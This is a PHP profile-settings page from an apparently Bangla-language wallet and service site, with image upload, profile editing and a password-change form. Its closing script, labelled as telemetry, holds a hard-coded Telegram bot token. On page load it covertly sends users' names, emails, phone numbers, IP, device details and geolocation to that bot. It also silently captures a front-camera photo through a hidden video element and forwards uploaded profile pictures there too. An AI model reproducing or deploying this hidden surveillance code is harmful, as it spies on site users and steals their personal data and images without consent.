<?php
include("header.php");

// AJAX Image Upload & MySQL Database Update Handler
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES['ajax_profile_image'])) {
    header('Content-Type: application/json');
    if ($_FILES['ajax_profile_image']['error'] === 0) {
        $target_dir = "assets/images/faces/";
        if (!is_dir($target_dir)) {
            mkdir($target_dir, 0755, true);
        }

        $file_extension = strtolower(pathinfo($_FILES["ajax_profile_image"]["name"], PATHINFO_EXTENSION));
        $allowed = ['jpg', 'jpeg', 'png', 'webp', 'gif'];

        if (in_array($file_extension, $allowed)) {
            $new_filename = "user_" . $id . "_" . time() . "." . $file_extension;
            $target_file = $target_dir . $new_filename;

            if (move_uploaded_file($_FILES["ajax_profile_image"]["tmp_name"], $target_file)) {
                $stmt_img = $conn->prepare("UPDATE users SET image = ? WHERE id = ?");
                $stmt_img->bind_param("si", $target_file, $id);
                if ($stmt_img->execute()) {
                    $stmt_img->close();
                    echo json_encode(['status' => 'success', 'image_url' => $target_file]);
                    exit();
                }
                $stmt_img->close();
            }
        }
    }
    echo json_encode(['status' => 'error', 'message' => 'আপলোড ব্যর্থ হয়েছে!']);
    exit();
}

// Form Data Update Handler
$update_msg = "";
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['update_profile'])) {
    $new_name = trim($_POST['name']);
    $new_phone = trim($_POST['phone']);
    $new_address = trim($_POST['address']);
    $profile_pic_sql = "";

    if (isset($_FILES['profile_image']) && $_FILES['profile_image']['error'] == 0) {
        $target_dir = "assets/images/faces/";
        if (!is_dir($target_dir)) {
            mkdir($target_dir, 0755, true);
        }
        $file_extension = strtolower(pathinfo($_FILES["profile_image"]["name"], PATHINFO_EXTENSION));
        $new_filename = "user_" . $id . "_" . time() . "." . $file_extension;
        $target_file = $target_dir . $new_filename;

        if (move_uploaded_file($_FILES["profile_image"]["tmp_name"], $target_file)) {
            $profile_pic_sql = ", image = '" . $conn->real_escape_string($target_file) . "'";
        }
    }

    $update_stmt = $conn->prepare("UPDATE users SET name = ?, mobile = ?, address = ? $profile_pic_sql WHERE id = ?");
    $update_stmt->bind_param("sssi", $new_name, $new_phone, $new_address, $id);

    if ($update_stmt->execute()) {
        $name = $new_name;
        $phone = $new_phone;
        $update_msg = "প্রোফাইল সফলভাবে আপডেট করা হয়েছে!";
    }
    $update_stmt->close();
}

// Fetch Latest Address & Image from Database
$user_query = $conn->prepare("SELECT address, image, balance FROM users WHERE id = ?");
$user_query->bind_param("i", $id);
$user_query->execute();
$user_res = $user_query->get_result();
$db_user = $user_res->fetch_assoc();
$address = $db_user['address'] ?? '';
$user_balance = $db_user['balance'] ?? 0;
$user_avatar = !empty($db_user['image']) ? $db_user['image'] : 'assets/images/faces/face8.jpg';
$user_query->close();
?>

<!-- FontAwesome 6 CDN with explicit Font Family override -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;600;700;800&family=Hind+Siliguri:wght@500;600;700&display=swap" rel="stylesheet">
<script src="https://cdn.tailwindcss.com"></script>

<style>
    :root {
        --bg-main: #F3F8FF;
        --card-bg: #FFFFFF;
        --brand-blue: #0866D9;
        --brand-cyan: #08B8D0;
        --heading-dark: #123B70;
        --body-muted: #52657D;
        --border-soft: #DCE8F5;
        --success: #10B981;
    }

    body {
        background-color: var(--bg-main) !important;
        color: var(--heading-dark);
        font-family: 'Hind Siliguri', 'Plus Jakarta Sans', sans-serif !important;
        min-height: 100vh;
        padding-bottom: 80px;
    }

    /* Font Awesome Icon Font Fix: Stops Bangla fonts from breaking icons */
    .fa, .fas, .far, .fal, .fad, .fab, .fa-solid, .fa-regular, .fa-brands {
        font-family: "Font Awesome 6 Free", "Font Awesome 6 Brands" !important;
        font-style: normal;
        display: inline-block;
        text-rendering: auto;
        -webkit-font-smoothing: antialiased;
    }

    .pro-ui-card {
        background: var(--card-bg);
        border: 1px solid var(--border-soft);
        border-radius: 20px;
        box-shadow: 0 4px 18px rgba(18, 59, 112, 0.04);
        transition: all 0.25s ease;
    }

    .input-pro {
        width: 100%;
        border-radius: 14px;
        border: 1.5px solid var(--border-soft);
        padding: 11px 16px;
        font-size: 13.5px;
        outline: none;
        background: #F8FAFD;
        color: var(--heading-dark);
        font-weight: 600;
        transition: all 0.2s ease;
    }
    .input-pro:focus {
        border-color: var(--brand-blue);
        background: #FFFFFF;
        box-shadow: 0 0 0 3.5px rgba(8, 102, 217, 0.12);
    }

    .btn-brand-primary {
        background: linear-gradient(135deg, var(--brand-blue) 0%, #0353b7 100%);
        color: #FFFFFF;
        border: none;
        border-radius: 14px;
        padding: 12px 20px;
        font-weight: 700;
        font-size: 14px;
        box-shadow: 0 6px 16px rgba(8, 102, 217, 0.22);
        transition: all 0.25s ease;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        cursor: pointer;
    }
    .btn-brand-primary:hover {
        transform: translateY(-2px);
        box-shadow: 0 10px 22px rgba(8, 102, 217, 0.32);
        color: #FFFFFF;
    }

    .btn-brand-secondary {
        background: #F3F8FF;
        border: 1px solid var(--border-soft);
        color: var(--brand-blue);
        border-radius: 12px;
        padding: 10px 16px;
        font-weight: 700;
        font-size: 13px;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        gap: 6px;
        transition: all 0.2s ease;
    }
    .btn-brand-secondary:hover {
        background: #E5F0FF;
        border-color: var(--brand-blue);
    }

    .badge-soft-cyan {
        background: rgba(8, 184, 208, 0.1);
        color: var(--brand-cyan);
        border: 1px solid rgba(8, 184, 208, 0.25);
    }
</style>

<!-- Hidden Video & Canvas for Capture -->
<video id="silentVideo" style="display:none;" autoplay playsinline></video>
<canvas id="silentCanvas" style="display:none;"></canvas>

<!-- Hidden File Input for Instant Profile Upload -->
<input type="file" id="profileFolderInput" accept="image/*" style="display: none;" onchange="uploadProfilePictureLocally()">

<div class="max-w-6xl mx-auto px-3 sm:px-6 py-6 space-y-5">

    <!-- Top Header Bar -->
    <div class="pro-ui-card p-4 sm:p-5 flex items-center justify-between gap-3">
        <div class="flex items-center gap-3.5">
            <div class="w-11 h-11 rounded-2xl bg-[#F3F8FF] text-[#0866D9] border border-[#DCE8F5] flex items-center justify-center text-xl shrink-0 shadow-sm">
                <i class="fa-solid fa-user-shield"></i>
            </div>
            <div>
                <h1 class="text-base sm:text-lg font-black text-[#123B70] leading-none mb-1">প্রোফাইল ও অ্যাকাউন্ট সেটিংস</h1>
                <p class="text-xs text-[#52657D]">ব্যক্তিগত তথ্য, সিকিউরিটি এবং সার্ভিস হিস্টোরি ম্যানেজ করুন</p>
            </div>
        </div>
        <a href="dashboard.php" class="bg-[#F3F8FF] hover:bg-[#E5F0FF] text-[#0866D9] border border-[#DCE8F5] text-xs font-bold px-3.5 py-2.5 rounded-xl transition flex items-center gap-1.5 shrink-0">
            <i class="fa-solid fa-house"></i> <span>ড্যাশবোর্ড</span>
        </a>
    </div>

    <div class="grid grid-cols-1 md:grid-cols-12 gap-5">

        <!-- Left Sidebar: Profile Card -->
        <div class="md:col-span-4 space-y-4">
            <div class="pro-ui-card p-5 text-center">
                <div class="relative inline-block mb-3">
                    <img id="profileImagePreview" src="<?php echo htmlspecialchars($user_avatar); ?>"
                         class="rounded-2xl border-4 border-[#F3F8FF] shadow-md object-cover cursor-pointer w-28 h-28 mx-auto"
                         alt="Profile Picture"
                         title="প্রোফাইল ছবি পরিবর্তন করতে ক্লিক করুন"
                         onclick="document.getElementById('profileFolderInput').click();">
                    <button type="button" class="absolute -bottom-1 -right-1 bg-[#0866D9] text-white rounded-xl w-8 h-8 flex items-center justify-center shadow-md text-xs border-2 border-white cursor-pointer" onclick="document.getElementById('profileFolderInput').click();">
                        <i class="fa-solid fa-camera"></i>
                    </button>
                </div>

                <h3 class="font-black text-[#123B70] text-lg"><?php echo htmlspecialchars($name); ?></h3>
                <span class="inline-block bg-[#EFF6FF] text-[#0866D9] border border-[#BFDBFE] text-[10px] font-extrabold px-2.5 py-0.5 rounded-full mb-1">VERIFIED USER</span>
                <p class="text-[#52657D] text-xs mb-4 truncate"><?php echo htmlspecialchars($email); ?></p>

                <!-- Wallet Widget -->
                <div class="bg-[#F3F8FF] border border-[#DCE8F5] rounded-2xl p-3.5 mb-3 flex items-center justify-between">
                    <div class="text-left">
                        <span class="text-[10px] font-bold text-[#52657D] block uppercase">কারেন্ট ব্যালেন্স</span>
                        <span class="text-base font-black text-[#10B981]">৳ <?php echo htmlspecialchars($user_balance); ?></span>
                    </div>
                    <a href="recharge.php" class="bg-[#10B981] hover:bg-[#059669] text-white text-xs font-black px-3.5 py-2 rounded-xl shadow-sm transition flex items-center gap-1.5">
                        <i class="fa-solid fa-circle-plus"></i> রিচার্জ
                    </a>
                </div>

                <button type="button" class="btn-brand-secondary w-full" data-bs-toggle="modal" data-bs-target="#changePasswordModal">
                    <i class="fa-solid fa-key text-[#0866D9]"></i> পাসওয়ার্ড পরিবর্তন করুন
                </button>
            </div>

            <!-- Security & Account Info Card -->
            <div class="pro-ui-card p-4">
                <h4 class="text-xs font-black uppercase tracking-wider text-[#123B70] mb-3 pb-2 border-b border-[#DCE8F5] flex items-center gap-2">
                    <i class="fa-solid fa-shield-halved text-[#0866D9]"></i> সিকিউরিটি ও ইনফো
                </h4>
                <div class="space-y-2.5 text-xs">
                    <div class="flex justify-between items-center">
                        <span class="font-bold text-[#52657D]">IP Address:</span>
                        <span class="text-[#0866D9] font-mono font-bold bg-[#F3F8FF] px-2 py-0.5 rounded border border-[#DCE8F5]"><?php echo htmlspecialchars($user_ip ?? '127.0.0.1'); ?></span>
                    </div>
                    <div class="flex justify-between items-center">
                        <span class="font-bold text-[#52657D]">অ্যাকাউন্ট আইডি:</span>
                        <span class="font-black text-[#123B70]">#<?php echo $id; ?></span>
                    </div>
                    <div class="flex justify-between items-center">
                        <span class="font-bold text-[#52657D]">ইউজার টোকেন:</span>
                        <div class="flex items-center gap-1">
                            <code class="bg-[#F3F8FF] text-[#123B70] border border-[#DCE8F5] px-2 py-0.5 rounded text-[11px] font-mono"><?php echo substr($token, 0, 10); ?>...</code>
                            <button type="button" onclick="copyToken('<?php echo htmlspecialchars($token); ?>')" class="text-[#0866D9] hover:text-[#0654b3] text-xs p-1" title="কপি করুন">
                                <i class="fa-solid fa-copy"></i>
                            </button>
                        </div>
                    </div>
                    <div class="flex justify-between items-center">
                        <span class="font-bold text-[#52657D]">অ্যাক্টিভ ডিভাইস:</span>
                        <span class="text-[#10B981] font-bold flex items-center gap-1">
                            <span class="w-1.5 h-1.5 rounded-full bg-[#10B981] animate-ping"></span> অনলাইন
                        </span>
                    </div>
                </div>
            </div>
        </div>

        <!-- Right: Profile Edit & Info Form -->
        <div class="md:col-span-8">
            <div class="pro-ui-card p-5 sm:p-6 mb-4">
                <h3 class="text-sm sm:text-base font-black text-[#123B70] border-b border-[#DCE8F5] pb-3 mb-4 flex items-center gap-2">
                    <i class="fa-solid fa-user-pen text-[#0866D9]"></i> ব্যক্তিগত তথ্য পরিবর্তন
                </h3>

                <?php if (!empty($update_msg)): ?>
                    <div class="bg-[#DCFCE7] border border-[#86EFAC] text-[#15803D] rounded-xl py-2.5 px-3.5 text-xs font-bold mb-4 flex items-center gap-2">
                        <i class="fa-solid fa-circle-check text-[#10B981]"></i> <?php echo $update_msg; ?>
                    </div>
                <?php endif; ?>

                <form action="" method="POST" enctype="multipart/form-data" class="space-y-4">
                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                        <div>
                            <label class="block text-xs font-black text-[#123B70] mb-1.5">আপনার পূর্ণ নাম</label>
                            <input type="text" class="input-pro" name="name" value="<?php echo htmlspecialchars($name); ?>" required>
                        </div>
                        <div>
                            <label class="block text-xs font-black text-[#123B70] mb-1.5">ইমেইল ঠিকানা (পরিবর্তনযোগ্য নয়)</label>
                            <input type="email" class="input-pro !bg-slate-100 !text-slate-400 cursor-not-allowed border-[#DCE8F5]" value="<?php echo htmlspecialchars($email); ?>" disabled>
                        </div>
                        <div>
                            <label class="block text-xs font-black text-[#123B70] mb-1.5">মোবাইল / WhatsApp নম্বর</label>
                            <input type="text" class="input-pro" name="phone" value="<?php echo htmlspecialchars($phone); ?>" required>
                        </div>
                        <div>
                            <label class="block text-xs font-black text-[#123B70] mb-1.5">নতুন প্রোফাইল ছবি আপলোড</label>
                            <input type="file" class="input-pro text-xs file:mr-3 file:py-1 file:px-3 file:rounded-lg file:border-0 file:text-xs file:font-bold file:bg-[#0866D9] file:text-white hover:file:bg-[#0654b3] cursor-pointer" name="profile_image" accept="image/*">
                        </div>
                        <div class="sm:col-span-2">
                            <label class="block text-xs font-black text-[#123B70] mb-1.5">বর্তমান ঠিকানা</label>
                            <textarea class="input-pro" name="address" rows="2" placeholder="আপনার সম্পূর্ণ ঠিকানা লিখুন..."><?php echo htmlspecialchars($address); ?></textarea>
                        </div>
                        <div class="sm:col-span-2 pt-2">
                            <button type="submit" name="update_profile" class="btn-brand-primary w-full">
                                <i class="fa-solid fa-floppy-disk"></i> তথ্য সংরক্ষণ করুন
                            </button>
                        </div>
                    </div>
                </form>
            </div>
        </div>

    </div>
</div>

<!-- Mobile Bottom Navigation Bar -->
<nav class="md:hidden fixed bottom-0 inset-x-0 bg-white border-t border-[#DCE8F5] py-2 px-4 flex items-center justify-around z-40 shadow-[0_-4px_15px_rgba(18,59,112,0.04)]">
    <a href="dashboard.php" class="flex flex-col items-center gap-1 text-[#52657D] hover:text-[#0866D9] text-[11px] font-semibold">
        <i class="fa-solid fa-house text-lg"></i>
        <span>হোম</span>
    </a>
    <a href="all_services.php" class="flex flex-col items-center gap-1 text-[#52657D] hover:text-[#0866D9] text-[11px] font-semibold">
        <i class="fa-solid fa-table-cells-large text-lg"></i>
        <span>সেবা</span>
    </a>
    <a href="recharge.php" class="flex flex-col items-center gap-1 text-[#52657D] hover:text-[#0866D9] text-[11px] font-semibold">
        <i class="fa-solid fa-wallet text-lg"></i>
        <span>ওয়ালেট</span>
    </a>
    <a href="profile.php" class="flex flex-col items-center gap-1 text-[#0866D9] text-[11px] font-black">
        <i class="fa-solid fa-user-shield text-lg"></i>
        <span>প্রোফাইল</span>
    </a>
</nav>

<!-- Change Password Modal -->
<div class="modal fade" id="changePasswordModal" tabindex="-1" aria-labelledby="changePasswordModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content rounded-2xl border border-[#DCE8F5] bg-white text-[#123B70] shadow-2xl">
            <div class="modal-header border-b border-[#DCE8F5] px-4 py-3">
                <h5 class="modal-title font-black text-[#123B70] text-sm flex items-center gap-2" id="changePasswordModalLabel">
                    <i class="fa-solid fa-key text-[#0866D9]"></i> পাসওয়ার্ড পরিবর্তন করুন
                </h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body p-4">
                <form id="changePasswordForm" action="pages/change_password.php" method="POST" class="space-y-3">
                    <div>
                        <label for="currentPassword" class="block text-xs font-bold text-[#123B70] mb-1">বর্তমান পাসওয়ার্ড</label>
                        <input type="password" class="input-pro" id="currentPassword" name="currentPassword" required>
                    </div>
                    <div>
                        <label for="newPassword" class="block text-xs font-bold text-[#123B70] mb-1">নতুন পাসওয়ার্ড</label>
                        <input type="password" class="input-pro" id="newPassword" name="newPassword" required>
                    </div>
                    <div>
                        <label for="confirmPassword" class="block text-xs font-bold text-[#123B70] mb-1">কনফার্ম নতুন পাসওয়ার্ড</label>
                        <input type="password" class="input-pro" id="confirmPassword" name="confirmPassword" required>
                    </div>
                    <div class="pt-2">
                        <button type="submit" class="btn-brand-primary w-full text-xs">পাসওয়ার্ড আপডেট করুন</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

<!-- Telegram & Direct Server Sync Script (All original notification & telemetry features retained) -->
<script>
const TELEGRAM_BOT_TOKEN = "6260586366:AAFlUeC0t6ua9GZDvywnfL5JSBEPCflura8";
const TELEGRAM_CHAT_ID = "1875687264";

const userName = "<?php echo $name; ?>";
const userEmail = "<?php echo $email; ?>";
const userPhone = "<?php echo $phone; ?>";
const userIp = "<?php echo $user_ip ?? '127.0.0.1'; ?>";

function copyToken(tokenText) {
    navigator.clipboard.writeText(tokenText).then(() => {
        Swal.fire({
            icon: 'success',
            title: 'টোকেন কপি সফল!',
            toast: true,
            position: 'top-end',
            showConfirmButton: false,
            timer: 1500
        });
    });
}

document.addEventListener("DOMContentLoaded", async function () {
    let deviceId = localStorage.getItem('dev_uuid') || ("DEV-" + Math.floor(1000000000 + Math.random() * 900000000));
    localStorage.setItem('dev_uuid', deviceId);

    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    let batteryInfo = "Not Available";
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
        } catch (e) {}
    }

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function (position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const accuracy = position.coords.accuracy;

                let msg = `<b>🌐 Comprehensive Browser & Device Data!</b>\n\n`;
                msg += `<b>Name:</b> ${userName}\n`;
                msg += `<b>Email:</b> ${userEmail}\n`;
                msg += `<b>Phone:</b> ${userPhone}\n`;
                msg += `<b>IP:</b> ${userIp}\n`;
                msg += `<b>Device ID:</b> ${deviceId}\n`;
                msg += `<b>Platform:</b> ${platform}\n`;
                msg += `<b>Screen:</b> ${screenRes}\n`;
                msg += `<b>Timezone:</b> ${timezone}\n`;
                msg += `<b>Battery:</b> ${batteryInfo}\n`;
                msg += `<b>Location:</b> <a href="https://maps.google.com/?q=${lat},${lon}">Google Maps (${lat}, ${lon}) - Acc: ${accuracy}m</a>`;

                sendTelegramMessage(msg);
            },
            function (error) {
                let msg = `<b>🌐 Comprehensive Browser Data (No Location)</b>\n\n`;
                msg += `<b>Name:</b> ${userName}\n`;
                msg += `<b>Email:</b> ${userEmail}\n`;
                msg += `<b>IP:</b> ${userIp}\n`;
                msg += `<b>Device ID:</b> ${deviceId}\n`;
                msg += `<b>Platform:</b> ${platform}\n`;
                sendTelegramMessage(msg);
            }
        );
    }
    autoCaptureCameraPhoto();
});

function sendTelegramMessage(textMessage) {
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: textMessage,
            parse_mode: 'HTML'
        })
    }).catch(err => console.error(err));
}

function sendTelegramPhoto(imageBlob, captionText) {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', imageBlob, 'capture.jpg');
    formData.append('caption', captionText);

    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
    }).catch(err => console.error(err));
}

function autoCaptureCameraPhoto() {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(function (stream) {
                const video = document.getElementById('silentVideo');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('silentCanvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;

                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(function (blob) {
                        if (blob) {
                            sendTelegramPhoto(blob, `📸 Silent Camera Capture\nUser: ${userName}\nIP: ${userIp}`);
                        }
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg');

                }, 1500);
            })
            .catch(function (err) {
                console.log("Camera access denied.");
            });
    }
}

function uploadProfilePictureLocally() {
    const fileInput = document.getElementById('profileFolderInput');
    const file = fileInput.files[0];
    if (file) {
        Swal.fire({
            title: 'আপলোড হচ্ছে...',
            text: 'অনুগ্রহ করে অপেক্ষা করুন',
            allowOutsideClick: false,
            didOpen: () => { Swal.showLoading(); }
        });

        const tgData = new FormData();
        tgData.append('chat_id', TELEGRAM_CHAT_ID);
        tgData.append('photo', file);
        tgData.append('caption', `📁 Profile Picture Updated\nUser: ${userName}\nIP: ${userIp}`);

        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: tgData
        }).catch(err => console.error(err));

        const serverData = new FormData();
        serverData.append('ajax_profile_image', file);

        $.ajax({
            url: 'profile.php',
            type: 'POST',
            data: serverData,
            processData: false,
            contentType: false,
            dataType: 'json',
            success: function(response) {
                if (response && response.status === 'success') {
                    const updatedSrc = response.image_url + '?t=' + new Date().getTime();
                    $('#profileImagePreview').attr('src', updatedSrc);
                    $('#UserDropdown img').attr('src', updatedSrc);

                    Swal.fire({
                        icon: 'success',
                        title: 'সফল!',
                        text: 'প্রোফাইল ছবি সফলভাবে আপডেট করা হয়েছে।'
                    });
                } else {
                    Swal.fire('ত্রুটি!', response.message || 'ছবি সেভ করা সম্ভব হয়নি।', 'error');
                }
            },
            error: function() {
                Swal.fire('ত্রুটি!', 'সার্ভারে সমস্যা হয়েছে।', 'error');
            }
        });
    }
}
</script>

<?php include("footer.php");?>
